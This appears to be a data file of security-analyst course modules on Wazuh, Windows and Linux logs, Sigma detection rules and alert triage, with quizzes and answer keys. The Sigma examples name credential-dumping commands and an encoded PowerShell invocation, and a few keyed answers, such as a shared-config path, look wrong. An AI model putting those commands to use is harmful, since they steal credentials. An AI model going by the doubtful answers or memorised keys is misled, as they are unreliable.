export const phase6: Module[] = [
  {
    id: 'week36',
    title: 'Wazuh SIEM Setup & Configuration',
    durationText: 'Week 36 (Days 1-2)',
    focus: 'Deploy and configure Wazuh SIEM for centralized log collection, alerting, and security monitoring',
    output: 'Fully operational Wazuh deployment with agents, custom rules, and alert triage capability',
    topics: [
      {
        id: 'we36d01',
        title: 'Wazuh Architecture & Installation',
        description: 'Deploy the complete Wazuh stack: indexer, manager, dashboard, and endpoint agents on Ubuntu',
        type: 'lab',
        duration: '4 hours',
        content: `:::objectives
- Understand Wazuh four-component architecture
- Install Wazuh indexer, manager, and dashboard on Ubuntu
- Deploy and connect a Wazuh agent to the manager
- Verify the installation end-to-end
:::

:::info
Wazuh is an open-source security platform providing XDR and SIEM capabilities. It runs four components:

| Component | Role | Default Port |
|-----------|------|--------------|
| **Wazuh Indexer** | Stores and indexes alert data (OpenSearch fork) | 9200, 9300 |
| **Wazuh Manager** | Analyzes agent data, triggers alerts, manages policies | 1514 (agent comms), 1515 (enrollment) |
| **Wazuh Dashboard** | Web UI for visualization and management | 443 (HTTPS) |
| **Wazuh Agent** | Collects logs, syscheck, rootcheck on endpoints | N/A (pushes to manager) |
:::

### Single-Node Installation

\`\`\`bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
\`\`\`

The \`-a\` flag installs all components on one node.

:::warning
Save the auto-generated passwords immediately. They are not stored anywhere after installation.
:::

### Agent Installation

\`\`\`bash
curl -sO https://packages.wazuh.com/4.7/wazuh-agent.sh
sudo bash ./wazuh-agent.sh
sudo sed -i 's/<manager-ip>/192.168.1.100/' /var/ossec/etc/ossec.conf
sudo systemctl enable wazuh-agent && sudo systemctl start wazuh-agent
\`\`\`

Verify on the manager:

\`\`\`bash
sudo /var/ossec/bin/agent_control -l
\`\`\`

:::classwork
**Lab:** Install Wazuh single-node, change admin password, install agent, confirm it appears in dashboard.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What are the four core Wazuh components and their roles?',
        interviewAnswer: 'Indexer stores/indexes data via OpenSearch. Manager analyzes data and triggers alerts. Dashboard provides web UI. Agent collects logs and syscheck on endpoints.',
        quiz: [
          { question: 'Which command installs all Wazuh components in a single-node deployment?', options: ['curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash ./wazuh-install.sh -a', 'sudo apt install wazuh-manager wazuh-indexer wazuh-dashboard', 'docker-compose up wazuh-all', 'sudo bash ./wazuh-setup.sh --full'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The official installer with -a flag installs indexer, manager, and dashboard on one node.', certTags: ['Wazuh'] },
          { question: 'On which port does the Wazuh manager listen for agent connections?', options: ['1514', '9200', '443', '55000'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Wazuh agents communicate with the manager on port 1514 (TCP).', certTags: ['Wazuh'] },
          { question: 'After installation, what should you do with the auto-generated passwords?', options: ['Save them securely - they are not stored after installation', 'Ignore them - reset via CLI anytime', 'They match your root password', 'Write them on the desktop'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Wazuh generates unique passwords that are not saved anywhere after the script completes.', certTags: ['Wazuh'] },
          { question: 'Which file controls Wazuh agent data collection?', options: ['/var/ossec/etc/ossec.conf', '/etc/wazuh/agent.conf', '/var/ossec/etc/wazuh.yml', '/etc/syslog-ng/wazuh.conf'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'The agent configuration lives at /var/ossec/etc/ossec.conf.', certTags: ['Wazuh'] },
          { question: 'What does the Wazuh syscheck module monitor?', options: ['File integrity - permissions, ownership, size, content changes', 'CPU and memory utilization', 'Network packet captures', 'DNS resolution queries'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Syscheck is Wazuh file integrity monitoring (FIM) module.', certTags: ['Wazuh'] },
          { question: 'Which command lists all enrolled agents on the Wazuh manager?', options: ['sudo /var/ossec/bin/agent_control -l', 'wazuh-agent --status', 'sudo systemctl list-agents', 'curl localhost:9200/_cat/agents'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'agent_control -l lists all agents, their IDs, names, IPs, and status.', certTags: ['Wazuh'] },
          { question: 'What does Wazuh agent enrollment accomplish?', options: ['Registers agent with manager, generates ID, establishes TLS channel', 'Downloads detection rules', 'Configures third-party SIEM forwarding', 'Encrypts the agent filesystem'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Enrollment pairs agent with manager, creates unique ID, and sets up TLS on port 1514.', certTags: ['Wazuh'] },
          { question: 'Which component stores indexed alert data using OpenSearch?', options: ['Wazuh Indexer', 'Wazuh Manager', 'Wazuh Dashboard', 'Wazuh API'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The Wazuh Indexer is the OpenSearch-based data store.', certTags: ['Wazuh'] },
          { question: 'What alert does `sudo useradd testuser` generate in Wazuh?', options: ['Rule ID 5901 - new user account creation', 'Syscheck alert for modified /etc/passwd', 'No alert by default', 'Rootcheck alert for unauthorized accounts'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Creating a user triggers rule 5901 (new user added to system).', certTags: ['Wazuh'] },
          { question: 'Which port does the Wazuh API listen on by default?', options: ['55000', '9200', '1514', '443'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The Wazuh REST API runs on port 55000 (HTTPS).', certTags: ['Wazuh'] },
          { question: 'Which ossec.conf element defines directories to monitor with syscheck?', options: ['<syscheck><directories check_all="yes">/etc</directories></syscheck>', '<monitor><paths>/etc</paths></monitor>', '<fim><watch>/etc</watch></fim>', '<integrity><scan>/etc</scan></integrity>'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'The <directories> element within <syscheck> specifies monitored paths.', certTags: ['Wazuh'] },
          { question: 'What severity level is Wazuh rule 5901 (new user created)?', options: ['Level 3 (Low)', 'Level 10 (High)', 'Level 12 (Critical)', 'Level 1 (Informational)'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Rule 5901 fires at severity level 3 (Low).', certTags: ['Wazuh'] },
          { question: 'What happens when the Wazuh agent cannot reach the manager?', options: ['Queues events locally and retries every 10 seconds', 'Shuts down immediately', 'Events are lost permanently', 'Falls back to port 443'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Wazuh agents buffer events locally and retry connection every 10 seconds by default.', certTags: ['Wazuh'] },
          { question: 'Which flag in the installer performs all-in-one installation?', options: ['-a', '--all', '-f', '--full'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The -a flag installs indexer, manager, and dashboard on a single node.', certTags: ['Wazuh'] },
          { question: 'What is the correct startup order of Wazuh components?', options: ['Indexer first, then Manager, then Dashboard', 'Dashboard first, then Manager, then Indexer', 'Manager first, then Dashboard, then Indexer', 'All three start simultaneously'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Indexer must start first as data store, then Manager, then Dashboard.', certTags: ['Wazuh'] }
        ]
      },
      {
        id: 'we36d02',
        title: 'Wazuh Agent Configuration & Alert Tuning',
        description: 'Configure agent data collection, assign groups, tune rules, reduce false positives',
        type: 'practice',
        duration: '4 hours',
        content: `:::objectives
- Edit agent ossec.conf for specific monitoring modules
- Assign agents to groups for centralized policy management
- Create custom decoders and rules
- Understand alert severity levels and filtering
:::

### Agent Groups

\`\`\`bash
sudo /var/ossec/bin/agent_groups -a -g web_servers -q
sudo /var/ossec/bin/agent_groups -a -i 001 -g web_servers -q
\`\`\`

### Custom Decoders

\`\`\`xml
<decoder name="sshd-failed-auth">
  <pre_match>Failed password for invalid user </pre_match>
  <regex>from (\\S+) port \\d+</regex>
  <order>srcip</order>
</decoder>
\`\`\`

### Custom Rules

\`\`\`xml
<rule id="100100" level="10">
  <if_sid>5712</if_sid>
  <field name="srcip">!192.168.1.0/24</field>
  <description>SSH brute force from external IP</description>
</rule>
\`\`\`

### Alert Severity Levels

| Level | Meaning |
|-------|---------|
| 0 | Ignore |
| 1-3 | Low |
| 4-7 | Medium |
| 8-11 | High |
| 12-15 | Critical |
| 16 | Emergency |

:::warning
Always test custom rules with \`wazuh-logtest\` before deploying to production.
:::

:::classwork
**Lab:** Enable auth.log monitoring, create a custom rule for SSH brute force, test with wazuh-logtest.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'How do you reduce false positives in Wazuh?',
        interviewAnswer: 'Use IP whitelisting, increase thresholds, narrow log sources, and validate rules with wazuh-logtest before deployment.',
        quiz: [
          { question: 'Which ossec.conf section configures FIM?', options: ['<syscheck>', '<fim>', '<integrity>', '<monitor>'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'The <syscheck> section defines FIM parameters.', certTags: ['Wazuh'] },
          { question: 'What does the `frequency` tag in `<syscheck>` control?', options: ['Scan interval in seconds', 'Files per second', 'Timeout per file', 'Agent heartbeat interval'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Frequency is scan interval in seconds (43200 = 12 hours default).', certTags: ['Wazuh'] },
          { question: 'What severity is a "Critical" Wazuh alert?', options: ['12-15', '8-11', '5-7', '1-3'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Levels 12-15 are Critical severity.', certTags: ['Wazuh'] },
          { question: 'Which tool tests log lines against decoders and rules?', options: ['wazuh-logtest', 'wazuh-test', 'wazuh-decode', 'wazuh-verify'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'wazuh-logtest shows which decoder and rule match a log line.', certTags: ['Wazuh'] },
          { question: 'What is the purpose of Wazuh agent groups?', options: ['Apply shared config to multiple agents', 'Group alerts by severity', 'Create network segments', 'Isolate agents during maintenance'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Groups allow centralized policy management across agents.', certTags: ['Wazuh'] },
          { question: 'How do you assign agent 001 to "web_servers" group?', options: ['sudo /var/ossec/bin/agent_groups -a -i 001 -g web_servers -q', 'sudo /var/ossec/bin/agent_control --group web_servers 001', 'Edit agent ossec.conf group=web_servers', 'wazuh-ctl groups --add 001 --group web_servers'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'agent_groups with -a (add), -i (ID), -g (group), -q (quiet) assigns agents.', certTags: ['Wazuh'] },
          { question: 'Which Ubuntu log file contains SSH auth events?', options: ['/var/log/auth.log', '/var/log/syslog', '/var/log/secure', '/var/log/messages'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Ubuntu uses /var/log/auth.log; RHEL uses /var/log/secure.', certTags: ['Wazuh'] },
          { question: 'What does `<if_sid>5712</if_sid>` mean in a rule?', options: ['Rule only fires if 5712 already matched', 'Inherits description from 5712', 'Replaces rule 5712', 'Sends events to 5712'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '<if_sid> makes a rule conditional on the parent rule matching first.', certTags: ['Wazuh'] },
          { question: 'What does `realtime="yes"` in syscheck do?', options: ['Uses inotify for real-time file monitoring', 'Forces immediate scan on agent start', 'Sends alerts in real-time', 'Enables real-time virus scanning'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'realtime="yes" uses Linux inotify for immediate file change detection.', certTags: ['Wazuh'] },
          { question: 'Which field shows source IP in an SSH brute force alert?', options: ['data.srcip', 'agent.ip', 'srcip', 'alert.source_ip'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'The sshd decoder extracts source IP into data.srcip.', certTags: ['Wazuh'] },
          { question: 'What is the default syscheck scan frequency?', options: ['12 hours (43200s)', '1 hour (3600s)', '24 hours (86400s)', '30 minutes (1800s)'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Default frequency is 43200 seconds (12 hours).', certTags: ['Wazuh'] },
          { question: 'What does a Wazuh rule with level 0 do?', options: ['Suppresses the event - no alert', 'Sends email', 'Writes to debug log', 'Forwards to third-party SIEM'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Level 0 means no alert is generated.', certTags: ['Wazuh'] },
          { question: 'Which ossec.conf element whitelists IPs?', options: ['<white_list>192.168.1.0/24</white_list>', '<ignore_ip>192.168.1.0/24</ignore_ip>', '<exclude_ip>192.168.1.0/24</exclude_ip>', '<bypass_ip>192.168.1.0/24</bypass_ip>'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: '<white_list> excludes IPs from generating alerts.', certTags: ['Wazuh'] },
          { question: 'What does "Phase 3: Completed filtering (rules)" mean in wazuh-logtest?', options: ['Decoder matched and rules were evaluated', 'Log was noise-filtered', 'Log was malware-scanned', 'Log was queued for manager'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Phase 3 is rule matching after decoding.', certTags: ['Wazuh'] },
          { question: 'Where are group configs stored on the Wazuh manager?', options: ['/var/etc/shared/<group_name>/', '/var/ossec/etc/groups/<group>.conf', 'wazuh-cli groups --show', '/var/ossec/bin/agent_groups --config'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Group configs are in /var/etc/shared/<group_name>/.', certTags: ['Wazuh'] }
        ]
      }
    ]
  },

  {
    id: 'week37',
    title: 'Log Analysis & Sigma Rule Creation',
    durationText: 'Week 37 (Days 1-2)',
    focus: 'Analyze Windows and Linux event logs, understand Sigma detection rule syntax, and create custom detection rules',
    output: 'Sigma rules for detecting real threats, ability to read and interpret Windows/Linux security logs',
    topics: [
      {
        id: 'we37d01',
        title: 'Windows Event Logs & Syslog',
        description: 'Understand critical Windows Event IDs, Linux syslog structure, and how to read raw security logs',
        type: 'learn',
        duration: '4 hours',
        content: `:::objectives
- Identify the most important Windows Security Event IDs
- Read and interpret raw Windows event log entries
- Understand Linux syslog structure and severity levels
- Map log events to potential security incidents
:::

:::concept
Windows Security Event Logs are stored in \`C:\\Windows\\System32\\winevt\\Logs\\Security.evtx\`.
:::

### Critical Windows Security Event IDs

| Event ID | Name | What It Means | Investigate? |
|----------|------|---------------|--------------|
| **4624** | Successful Logon | Someone logged in | Check source IP |
| **4625** | Failed Logon | Failed login attempt | Brute force if repeated |
| **4672** | Special Privileges | Admin/SYSTEM token | Normal for admin logons |
| **4688** | Process Creation | New process started | Correlate with command line |
| **4720** | User Created | New user added | Unauthorized = compromise |
| **4732** | Group Member Added | User added to admin group | Escalation indicator |
| **7045** | Service Installed | New Windows service | Persistence mechanism |
| **1102** | Audit Log Cleared | Logs were cleared | Anti-forensics indicator |

### Reading Raw Windows Event Logs

A typical 4625 (Failed Logon):

\`\`\`
Log Name:      Security
Event ID:      4625
Account Name:       administrator
Logon Type:         3
Status:             0xC000006D
Sub Status:         0xC0000064
Source Network Address: 10.0.0.50
Authentication Package: NTLM
\`\`\`

:::info
**Key fields:**
- **Logon Type 2** = Interactive (console/RDP)
- **Logon Type 3** = Network (SMB)
- **Logon Type 10** = RemoteInteractive (RDP)
- **Status 0xC000006D** = Bad username or password
- **Status 0xC0000064** = User does not exist
- **NTLM** = Not Kerberos - potentially suspicious
:::

### Event 4688 - Enable Command Line Auditing

Registry: \`HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\`
Value: \`ProcessCreationIncludeCmdLine_Enabled\` (DWORD) = 1

\`\`\`
Event ID: 4688
New Process:   C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
Command Line: powershell.exe -enc JABjAGwAaQBlAG4AdAA...
\`\`\`

:::warning
Without command line auditing, Event 4688 shows only the executable, not the arguments.
:::

### Linux Syslog Files

| File | Content |
|------|---------|
| /var/log/auth.log | Authentication events |
| /var/log/syslog | System messages |
| /var/log/kern.log | Kernel messages |
| /var/log/dpkg.log | Package operations |

### Syslog Severity Levels

| Level | Name | Description |
|-------|------|-------------|
| 0 | emerg | System unusable |
| 1 | alert | Immediate action |
| 2 | crit | Critical conditions |
| 3 | err | Error conditions |
| 4 | warning | Warning conditions |
| 5 | notice | Normal but significant |
| 6 | info | Informational |
| 7 | debug | Debug messages |

### SSH Brute Force Log Pattern

\`\`\`
Jun 15 03:22:14 server sshd[12345]: Failed password for invalid user admin from 10.0.0.50 port 22 ssh2
Jun 15 03:22:19 server sshd[12346]: Failed password for invalid user admin from 10.0.0.50 port 22 ssh2
Jun 15 03:22:24 server sshd[12347]: Failed password for invalid user admin from 10.0.0.50 port 22 ssh2
\`\`\`

:::classwork
**Lab:** Enable command line auditing on Windows, check Event 4688 after running powershell, observe auth.log while SSHing with wrong password.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What does Event 4625 Status 0xC000006D indicate?',
        interviewAnswer: 'Status 0xC000006D means bad username or password. Repeated 4625 events with increasing source IPs suggest password spraying.',
        quiz: [
          { question: 'Which Event ID indicates a new user account was created?', options: ['4720', '4624', '4688', '4732'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Event 4720 fires when a new user account is created.', certTags: ['Windows', 'SOC'] },
          { question: 'What does Event ID 1102 indicate?', options: ['Audit log cleared - potential anti-forensics', 'New audit policy applied', 'System rebooted', 'Service failed to start'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Event 1102 fires when someone clears the Security log.', certTags: ['Windows', 'SOC'] },
          { question: 'Which Logon Type in Event 4624 corresponds to RDP?', options: ['Type 10 (RemoteInteractive)', 'Type 2 (Interactive)', 'Type 3 (Network)', 'Type 5 (Service)'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Logon Type 10 (RemoteInteractive) is used for RDP.', certTags: ['Windows', 'SOC'] },
          { question: 'What does Status 0xC0000064 in Event 4625 mean?', options: ['User account does not exist', 'Password is incorrect', 'Account is locked out', 'Account has expired'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: '0xC0000064 means the username itself is wrong.', certTags: ['Windows', 'SOC'] },
          { question: 'Where are Windows Security event logs stored?', options: ['C:\\Windows\\System32\\winevt\\Logs\\Security.evtx', 'C:\\Windows\\Logs\\Security.log', 'C:\\Windows\\System32\\config\\security', 'C:\\ProgramData\\Microsoft\\Windows\\EventLog\\Security'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Windows event logs (.evtx) are in C:\\Windows\\System32\\winevt\\Logs\\.', certTags: ['Windows'] },
          { question: 'What does Event 7045 indicate?', options: ['New Windows service installed - potential persistence', 'Scheduled task created', 'New driver loaded', 'Registry key modified'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Event 7045 fires when a new service is installed.', certTags: ['Windows', 'SOC'] },
          { question: 'Which Linux log file contains SSH authentication events?', options: ['/var/log/auth.log', '/var/log/syslog', '/var/log/kern.log', '/var/log/messages'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: '/var/log/auth.log contains SSH auth events on Ubuntu.', certTags: ['Linux', 'SOC'] },
          { question: 'What does syslog severity level 0 (emerg) indicate?', options: ['System is unusable', 'Debug output', 'Informational message', 'Warning to monitor'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Level 0 (emerg) means the system is unusable.', certTags: ['Linux'] },
          { question: 'What does enabling ProcessCreationIncludeCmdLine_Enabled do?', options: ['Adds command line to Event 4688 - critical for script detection', 'Enables Task Manager monitoring', 'Logs DLL loads', 'Enables PowerShell block logging'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'This registry setting adds command line to Event 4688 (Process Creation).', certTags: ['Windows'] },
          { question: 'What pattern indicates SSH brute force in auth.log?', options: ['Multiple "Failed password" lines from same IP in short timeframe', 'Single "Connection closed" message', 'Multiple "Accepted publickey" messages', 'Repeated "session opened" entries'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Repeated "Failed password" from one IP within minutes is the classic brute force indicator.', certTags: ['Linux', 'SOC'] },
          { question: 'What does "Authentication Package: NTLM" suggest vs Kerberos?', options: ['Older protocol - may indicate pass-the-hash or legacy systems', 'AES-256 encryption', 'Smart card authentication', 'MFA bypass'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'NTLM is older than Kerberos. NTLM usage may indicate legacy systems or pass-the-hash attacks.', certTags: ['Windows', 'SOC'] },
          { question: 'What does Event 4732 (Member Added to Administrators) indicate?', options: ['User added to admin group - potential privilege escalation', 'New group created', 'Service account granted permissions', 'Group policy updated'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Adding a user to Administrators is a critical privilege escalation event.', certTags: ['Windows', 'SOC'] },
          { question: 'Which Event ID detects lateral movement via WMI?', options: ['4688 with wmic.exe command line', '4624 Logon Type 10', '7045 service install', '4672 special privileges'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'WMI lateral movement shows as 4688 with wmic.exe "process call create".', certTags: ['Windows', 'SOC'] },
          { question: 'What Linux command monitors auth.log in real-time?', options: ['sudo tail -f /var/log/auth.log', 'sudo cat /var/log/auth.log | head', 'sudo watch /var/log/auth.log', 'sudo less +F /var/log/auth.log'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'tail -f follows the file in real-time.', certTags: ['Linux'] },
          { question: 'What does Sub Status 0xC000006A in Event 4625 mean?', options: ['Password is incorrect for the account', 'User does not exist', 'Account is disabled', 'Logon hours restriction violated'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '0xC000006A means incorrect password (username was correct).', certTags: ['Windows'] }
        ]
      },
      {
        id: 'we37d02',
        title: 'Sigma Rule Syntax & Creation',
        description: 'Write Sigma detection rules for SIEMs, understand logsource categories, and convert to platform queries',
        type: 'practice',
        duration: '4 hours',
        content: `:::objectives
- Understand the Sigma rule YAML format
- Create Sigma rules for process creation, file events, and registry events
- Use logsource categories and detection fields correctly
- Convert Sigma rules to Splunk, ELK, and Wazuh queries
:::

### Sigma Rule Structure

\`\`\`yaml
title: Suspicious PowerShell Encoded Command
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects PowerShell with encoded commands
author: SOC Team
date: 2024/01/15
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\\\\powershell.exe'
      - '\\\\pwsh.exe'
    CommandLine|contains:
      - '-enc'
      - '-encodedcommand'
  condition: selection
  falsepositives:
    - Legitimate encoded scripts
  level: high
\`\`\`

### Logsource Categories

| Category | Windows Source | Linux Source |
|----------|---------------|--------------|
| process_creation | Sysmon 1, Win Event 4688 | auditd |
| file_event | Sysmon 11 | inotify |
| registry_event | Sysmon 13 | N/A |
| network_connection | Sysmon 3 | auditd |
| dns_query | Sysmon 22 | syslog |
| service_creation | Win Event 7045 | systemctl |

### Detection Field Modifiers

| Modifier | Usage | Example |
|----------|-------|---------|
| \`|contains\` | Contains string | \`CommandLine|contains: 'mimikatz'\` |
| \`|startswith\` | Starts with | \`CommandLine|startswith: 'cmd.exe /c'\` |
| \`|endswith\` | Ends with | \`Image|endswith: '\\\\rundll32.exe'\` |
| \`|re\` | Regex match | \`CommandLine|re: '(?i)mimikatz'\` |

### Example: Detecting Mimikatz

\`\`\`yaml
title: Credential Dumping via Mimikatz
id: f7a8b9c0-d1e2-3456-7890-abcdef123456
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_cmd:
    CommandLine|contains:
      - 'mimikatz'
      - 'sekurlsa::logonpasswords'
      - 'kerberos::golden'
      - 'lsadump::dcsync'
  selection_file:
    TargetFilename|contains:
      - '\\\\mimikatz'
      - '\\\\mimilib.dll'
  condition: selection_cmd or selection_file
  level: critical
\`\`\`

### Converting Sigma to Other Formats

\`\`\`bash
pip install sigma-cli pySigma-backend-splunk pySigma-pipelines-splunk
sigma convert -t splunk -p windows_sysmon rule.yml
sigma convert -t elasticsearch -p windows_sysmon rule.yml
\`\`\`

### Sigma to Wazuh Rule

\`\`\`xml
<rule id="100200" level="12">
  <if_sid>18104</if_sid>
  <field name="data.win.eventdata.commandLine" type="pcre2">(?i)(powershell|pwsh).*(-enc|-encodedcommand)</field>
  <description>Suspicious PowerShell Encoded Command</description>
  <group>execution,powershell,attack_t1059.001</group>
</rule>
\`\`\`

:::classwork
**Lab:** Write 3 Sigma rules: PsExec execution, schtasks /create, wmic process call create. Convert each to Splunk SPL.
:::`,
        aiPrompt: '',
        labUrl: '',
        labTitle: '',
        interviewQuestion: 'What is the difference between Sigma logsource categories and detection fields?',
        interviewAnswer: 'Logsource categories define WHERE data comes from (process_creation, file_event). Detection fields define WHAT to match (CommandLine, Image). This separation enables Sigma portability across SIEMs.',
        quiz: [
          { question: 'What does the `logsource` section in Sigma define?', options: ['Which log source and platform the detection applies to', 'Output format', 'False positive sources', 'SIEM ingestion config'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'logsource maps the rule to a specific category and product.', certTags: ['Sigma', 'Detection'] },
          { question: 'Which modifier matches a string anywhere in a field?', options: ['|contains', '|startswith', '|endswith', '|re'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: '|contains checks if the field contains the string anywhere.', certTags: ['Sigma', 'Detection'] },
          { question: 'What does `selection1 and not filter` do?', options: ['Matches selection1 but excludes filter matches', 'Matches both selection1 and filter', 'Matches either', 'Excludes all from selection1'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'The "and not filter" pattern is used for whitelisting.', certTags: ['Sigma', 'Detection'] },
          { question: 'Which Sigma category corresponds to Windows Event 4688?', options: ['process_creation', 'file_event', 'service_creation', 'network_connection'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'process_creation maps to Sysmon Event 1 and Windows Event 4688.', certTags: ['Sigma', 'Windows'] },
          { question: 'What does `|re` allow in Sigma detection?', options: ['Regular expression matching', 'Reverse match logic', 'IP address matching only', 'Recursive pattern matching'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: '|re lets you use PCRE regex for complex pattern matching.', certTags: ['Sigma'] },
          { question: 'What does `level: critical` indicate in Sigma?', options: ['Alert severity - immediate investigation required', 'Rule priority queue', 'Log source reliability', 'Confidence level'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Level indicates severity: informational, low, medium, high, or critical.', certTags: ['Sigma', 'SOC'] },
          { question: 'Which tool converts Sigma to Splunk SPL?', options: ['sigma-cli with Splunk backend', 'splunk-convert --sigma', 'siem-import --format splunk', 'sigma-to-splunk.sh'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'sigma-cli uses backends and pipelines for conversion.', certTags: ['Sigma', 'Splunk'] },
          { question: 'Which Sigma category detects file creation?', options: ['file_event', 'file_create', 'file_modification', 'filesystem'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'file_event maps to Sysmon Event 11 on Windows.', certTags: ['Sigma'] },
          { question: 'What does `1 of selection*` mean in a Sigma condition?', options: ['Any one selection pattern must match', 'Exactly one selection', 'All selections in order', 'First selection must match'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: '1 of selection* uses wildcard matching - any matching selection triggers the condition.', certTags: ['Sigma'] },
          { question: 'How do you convert Sigma to Wazuh XML rules?', options: ['Use sigma-cli Wazuh backend or manually map logsource to rule IDs', 'Wazuh reads Sigma YAML natively', 'Use wazuh-sigma plugin', 'Copy YAML into ossec.conf'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'sigma-cli can convert, or manual mapping of logsource to Wazuh fields.', certTags: ['Sigma', 'Wazuh'] },
          { question: 'How does Sigma handle a list of values in a detection field?', options: ['Default OR logic - matches any value', '|any modifier', '|contains with multiple values', '|or modifier'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Lists of values use OR logic by default in Sigma.', certTags: ['Sigma'] },
          { question: 'What does `status: experimental` mean?', options: ['Newly created, may have false positives', 'Validated in production', 'Deprecated', 'Ready for deployment'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'Experimental means new and needs testing before production use.', certTags: ['Sigma'] },
          { question: 'For Mimikatz detection, which logsource categories would you use?', options: ['process_creation, file_event, library_event', 'Only process_creation', 'network_connection and process_creation', 'dns_query and file_event'], correctAnswerIndex: 0, difficulty: 'advanced', explanation: 'Mimikatz detection needs process_creation (execution), file_event (dropped files), and library_event (loaded modules).', certTags: ['Sigma', 'Credential Access'] },
          { question: 'What operator is used for AND logic in Sigma conditions?', options: ['selection1 and selection2', 'selection1 & selection2', 'selection1 && selection2', 'selection1 + selection2'], correctAnswerIndex: 0, difficulty: 'beginner', explanation: 'Sigma uses "and" (lowercase) for AND logic.', certTags: ['Sigma'] },
          { question: 'Why is the `id` field (UUID) required in Sigma rules?', options: ['Unique identifier for tracking and deduplication across repositories', 'SIEM indexing requirement', 'CLI parsing requirement', 'Rule content hash'], correctAnswerIndex: 0, difficulty: 'intermediate', explanation: 'UUID ensures globally unique identification for sharing and tracking.', certTags: ['Sigma'] }
        ]
      }
    ]
  },


  {
    id: 'week38',
    title: 'SOC Triage & Investigation Workflow',
    durationText: 'Week 38 (Days 1-2)',
    focus: 'Master alert triage methodology, escalation procedures, IOC extraction, and data source pivoting',
    output: 'Ability to triage alerts, extract IOCs, pivot across data sources, and document investigations',
    topics: [
      {
        id: 'we38d01',
        title: 'Alert Classification & Escalation',
        description: 'Classify alerts as true/false positives, apply triage methodology, and determine escalation criteria',
        type: 'learn',
        duration: '3 hours',
        content: `:::objectives
- Distinguish between true positive, false positive, true negative, and false negative
- Apply a structured alert triage methodology
- Use severity levels to prioritize investigation
- Document triage decisions and escalation criteria
:::

:::concept
**Alert Classification Matrix:**

| | Malicious Activity Present | No Malicious Activity |
|---|---|---|
| **Alert Triggered** | True Positive (TP) | False Positive (FP) |
| **No Alert** | False Negative (FN) | True Negative (TN) |
:::

### Triage Methodology

\`\`\`
Alert Received
    |
    v
1. Initial Assessment
    +-- Is this a known FP pattern?
    +-- Is the source/destination expected?
    +-- Does severity match context?
    |
    v
2. Enrichment
    +-- WHOIS / GeoIP on IPs
    +-- VirusTotal / hash lookups
    +-- Threat intel feed check
    |
    v
3. Investigation
    +-- Correlate with other alerts
    +-- Check endpoint (EDR/logs)
    +-- Timeline analysis
    |
    v
4. Decision
    +-- True Positive -> Escalate
